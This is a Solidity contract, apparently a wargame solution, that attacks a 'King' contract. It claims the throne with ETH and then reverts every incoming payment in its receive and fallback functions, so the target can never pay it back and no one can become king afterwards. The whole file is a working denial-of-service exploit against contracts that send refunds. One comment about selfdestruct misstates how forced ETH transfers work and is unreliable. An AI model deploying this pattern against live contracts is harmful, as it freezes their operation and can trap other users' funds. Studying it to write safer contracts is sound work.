// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title KingExploit
 * @dev Contract that can become the king but actively prevents receiving ETH,
 * thus preventing anyone else from becoming king afterwards
 */
contract KingExploit {
    address public kingContractAddress;
    address public owner;
    
    constructor(address _kingContractAddress) {
        kingContractAddress = _kingContractAddress;
        owner = msg.sender;
    }
    
    /**
     * @dev Function to claim the throne by sending ETH to the King contract.
     * This will make this contract the new king.
     */
    function claimThrone() public payable {
        // Send ETH to the King contract to become the new king
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = payable(kingContractAddress).call{value: msg.value}("");
        require(success, "Failed to claim throne");
    }
    
    /**
     * @notice Implementing receive function that reverts all incoming ETH transfers
     * This ensures that even if someone uses selfdestruct to send ETH to this contract,
     * they won't be able to make a successful transaction to the King contract
     * since this contract will revert when the King contract tries to transfer ETH back.
     */
    receive() external payable {
        revert("Cannot receive ETH");
    }
    
    /**
     * @notice Implementing fallback function that also reverts all transactions
     * for maximum protection
     */
    fallback() external payable {
        revert("Cannot receive ETH");
    }
}
